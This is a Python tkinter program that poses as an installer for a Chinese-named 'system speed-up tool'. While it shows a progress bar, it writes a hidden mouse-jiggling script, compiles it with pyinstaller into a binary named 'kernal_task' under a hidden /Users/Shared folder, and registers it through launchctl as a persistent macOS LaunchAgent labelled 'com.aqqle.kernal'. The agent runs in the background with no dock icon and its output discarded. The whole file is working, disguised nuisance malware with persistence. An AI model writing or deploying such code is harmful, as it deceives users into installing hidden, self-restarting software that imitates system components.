import os
import plistlib
import subprocess as sp
import sys
import tkinter as tk
import traceback
from time import sleep
from tkinter import messagebox as mb
from tkinter import ttk

APP_NAME = '系统加速工具'  # 可以换成其他名字
total_progress = 0
a_progress = 3

liumang_file = [
    'import pyautogui as pag',
    'from random import randint',
    'while True:',
    '    pag.sleep(60)',
    '    for _ in range(10):',
    '        pag.move(randint(-10, 10), randint(-10, 10))'
]

home = os.path.expanduser('~')
plist_data = {
    'Label': 'com.aqqle.kernal',
    'ProgramArguments': ['/Users/Shared/.dist/kernal_task'],
    'RunAtLoad': True,
    'KeepAlive': True,  # True = 自动重启
    'ThrottleInterval': 5,  # 重启间隔（秒）
    'AbandonProcessGroup': True,  # 后台运行
    'ProcessType': 'Background',  # 后台进程类型
    'NSUIElement': True,  # 不显示程序坞图标（GUI应用）
    'StandardOutPath': '/dev/null',  # 扔掉输出
    'StandardErrorPath': '/dev/null',  # 扔掉错误
    'EnvironmentVariables': {
        'PATH': '/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin',
        'HOME': home,
    },
    'WorkingDirectory': '/tmp',
}

total_progress += len(liumang_file)
total_progress += 2  # 2个依赖
total_progress += 7  # 打包 (给了更多刻度)
pack_count = 7  # 打包7倍刻度
total_progress += 2  # 创建自启动文件 & 设置自启动
total_progress *= a_progress


def start():
    info.set('欢迎使用%s' % APP_NAME)
    start_btn.config(state=tk.NORMAL)
    root.update()


def step1():
    try:
        start_btn.pack_forget()
        info.set('正在写文件')
        root.update()
        sleep(0.2)
        count = 0
        with open('/Users/Shared/.liumang-app-2-liumang.py', 'w') as file:
            for line in liumang_file:
                count += 1
                info.set('正在写文件 第%d/%d行' % (count, len(liumang_file)))
                file.write(line + '\n')
                for _ in range(a_progress):
                    progress.set(progress.get() + 1)
                    print('progess=%d/%d' % (progress.get(), total_progress))
                    root.update()
                    sleep(0.02)
                root.update()
        info.set('写文件完成')
        root.after(500, step2)
    except Exception as e:
        print(traceback.format_exc())
        print(type(e).__name__, ':', e)
        mb.showerror('错误', '安装失败, 请重新运行程序')
        root.destroy()


def step2():
    info.set('正在安装pyautogui')
    root.update()
    res = sp.run(
        [sys.executable, '-m', 'pip', 'install', 'pyautogui', '-i', 'https://pypi.tuna.tsinghua.edu.cn/simple/'])
    if res.returncode != 0:
        mb.showerror('错误', '安装失败, 请重新运行程序')
        root.destroy()
        return
    for _ in range(a_progress):
        progress.set(progress.get() + 1)
        print('progess=%d/%d' % (progress.get(), total_progress))
        root.update()
        sleep(0.05)
    root.update()

    info.set('正在安装pyinstaller')
    root.update()
    res = sp.run(
        [sys.executable, '-m', 'pip', 'install', 'pyinstaller', '-i', 'https://pypi.tuna.tsinghua.edu.cn/simple/'])
    if res.returncode != 0:
        mb.showerror('错误', '安装失败, 请重新运行程序')
        root.destroy()
        return
    for _ in range(a_progress):
        progress.set(progress.get() + 1)
        root.update()
        sleep(0.05)
    root.update()

    info.set('正在打包')
    rprogress = progress.get()
    root.update()
    command = ['pyinstaller', '--name', 'kernal_task', '/Users/Shared/.liumang-app-2-liumang.py', '--distpath',
               '/Users/Shared/.dist', '-F', '--clean', '--log-level=DEBUG']
    thread = sp.Popen(command, stdout=sp.PIPE, stderr=sp.STDOUT, text=True)
    l = 0
    for line in thread.stdout:
        for c in range(1, 10):
            try:
                l = int(line[:c])
            except ValueError:
                break
        if l < 10000:
            progress.set(rprogress + ((l / 10000) * (a_progress * pack_count)))
            print('progess=%d/%d' % (progress.get(), total_progress))
        root.update()
        print('l=%d' % l)
        print('line=%s' % line)
    thread.wait()
    if thread.returncode != 0:
        mb.showerror('错误', '安装失败, 请重新运行程序')
        root.destroy()
        return
    progress.set(rprogress + (a_progress * pack_count))
    print('progess=%d/%d' % (progress.get(), total_progress))
    root.update()

    info.set('正在创建自启动文件')
    root.update()
    plist_dir = os.path.expanduser('~/Library/LaunchAgents')
    plist_path = os.path.join(plist_dir, '%s.plist' % 'com.aqqle.kernal')
    with open(plist_path, 'wb') as f:
        plistlib.dump(plist_data, f)
    for _ in range(a_progress):
        progress.set(progress.get() + 1)
        print('progess=%d/%d' % (progress.get(), total_progress))
        root.update()
        sleep(0.05)
    root.update()

    info.set('正在设置自启动')
    root.update()
    res = install_daemon(plist_path)
    if not res:
        mb.showerror('错误', '安装失败, 请重新运行程序')
        root.destroy()
        return
    for _ in range(a_progress):
        progress.set(progress.get() + 1)
        print('progess=%d/%d' % (progress.get(), total_progress))
        root.update()
        sleep(0.05)
    root.update()

    print('progess=%d/%d' % (progress.get(), total_progress))
    info.set('安装完成')
    root.update()
    mb.showinfo('完成', '已成功将该软件安装到您的计算机')
    root.destroy()


def install_daemon(plist_path):
    sp.run(['launchctl', 'unload', '-w', plist_path], stderr=sp.DEVNULL, stdout=sp.DEVNULL)
    result = sp.run(['launchctl', 'load', '-w', plist_path], capture_output=True, text=True)

    if result.returncode == 0:
        label = os.path.basename(plist_path).replace('.plist', '')
        sp.run(['launchctl', 'start', label])
    else:
        return False
    return result.returncode == 0


root = tk.Tk()
root.title('%s安装程序' % APP_NAME)

progress = tk.IntVar(value=0)
info = tk.StringVar(value='安装程序正在启动')

tk.Label(root, text='%s安装程序' % APP_NAME, font=('Arial', 30)).pack()
ttk.Progressbar(root, orient=tk.HORIZONTAL, variable=progress, maximum=total_progress, length=300).pack(fill=tk.X)
tk.Label(root, textvariable=info, font=('Arial', 20)).pack()
start_btn = tk.Button(root, text='开始安装', font=('Arial', 20), command=step1, state=tk.DISABLED)
start_btn.pack(fill=tk.X)

root.after(1000, start)
root.focus_force()
root.mainloop()
